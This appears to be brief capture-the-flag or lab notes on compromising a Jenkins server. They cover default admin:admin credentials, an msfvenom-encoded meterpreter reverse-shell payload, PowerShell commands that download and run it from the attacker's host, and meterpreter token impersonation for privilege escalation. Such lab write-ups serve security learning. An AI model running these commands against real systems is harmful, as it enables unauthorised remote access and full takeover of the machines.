## Scanning
jenkins server at 8080

## Get in 
* admin:admin pwd default
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy-alternative-1
* Run groovy script for reverse shell.
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.229.114 LPORT=4440 -f exe -o a.exe
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.229.114:8080/shell-name.exe','shell-name.exe')"
powershell -c "Start-Process shell-name.exe"

# load meterpreter receiver in msfconsole
load incognito
impersonate_token "BUILTIN\Administrators"  # impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token
migrate PID-OF-service.exe  # it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).
```



## Extra
* Abusing Token Privileges For LPE - https://www.exploit-db.com/papers/42556
